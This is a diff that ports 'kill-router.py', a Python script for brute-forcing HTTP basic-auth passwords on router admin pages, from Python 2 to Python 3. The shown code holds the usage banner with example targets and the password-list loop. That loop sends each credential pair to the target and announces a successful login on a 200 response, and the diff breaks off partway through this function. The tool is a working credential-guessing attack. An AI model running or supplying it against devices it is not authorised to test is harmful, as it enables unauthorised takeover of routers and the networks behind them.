@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
 """
@@ -24,7 +24,7 @@ __BLOG__    =   'http://nanoshots.com.br'
 
 
 def usage():
-    print colored("""
+    print (colored("""
 
     ██ ▄█▀ ██▓ ██▓     ██▓        ██▀███   ▒█████   █    ██ ▄▄▄█████▓▓█████  ██▀███
     ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
@@ -37,35 +37,35 @@ def usage():
    ░  ░    ░      ░  ░    ░  ░      ░         ░ ░     ░                 ░  ░   ░
 
 
-    """, 'red', attrs=['bold'])
-    print colored("[*] By: Matheus Fidelis aka D0ctor", 'red', attrs=['bold'])
-    print colored("[!] Usage: ./kill-router.py -t [TARGET IP] -u [USER TO TEST] -p [PATH TO PASSLIST]", 'red', attrs=['bold'])
-    print colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -u admin -p passlist.txt", 'red', attrs=['bold'])
+    """, 'red', attrs=['bold']))
+    print(colored("[*] By: Matheus Fidelis aka D0ctor", 'red', attrs=['bold']))
+    print(colored("[!] Usage: ./kill-router.py -t [TARGET IP] -u [USER TO TEST] -p [PATH TO PASSLIST]", 'red', attrs=['bold']))
+    print(colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -u admin -p passlist.txt", 'red', attrs=['bold']))
 
 
 
 
 def bruteforce(target,passlist,username):
     #Abre a passlist
-    fd = open(passlist, 'rw')
+    fd = open(passlist, 'r', encoding='utf-8')
     passwords = fd.readlines()
     i = 0
-    print ""
-    print colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold'])
-    print ""
+    print("")
+    print(colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold']))
+    print("")
     for password in passwords:
         i = i + 1
         password = password.rstrip()
         test = requests.get('http://'+target, auth=(username, password))
         code = test.status_code
-        print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password)
+        print(colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password))
         if code == 200:
-            print ""
-            print colored("==========================[LOGIN FOUNDED]==========================", 'yellow', attrs=['bold'])
-            print ""
-            print colored("===================================================================", 'yellow', attrs=['bold'])
-            print colored("                 [  :: USER[%s] AND PASS[%s]  ]                    ", 'green', attrs=['bold']) % (username, password)
-            print colored("===================================================================", 'yellow', attrs=['bold'])
+            print("")
+            print(colored("==========================[LOGIN FOUNDED]==========================", 'yellow', attrs=['bold']))
+            print("")
+            print(colored("===================================================================", 'yellow', attrs=['bold']))
+            print(colored("                 [  :: USER[%s] AND PASS[%s]  ]                    ", 'green', attrs=['bold']) % (username, password))
+            print(colored("===================================================================", 'yellow', attrs=['bold']))
 
             sys.exit()
         else:
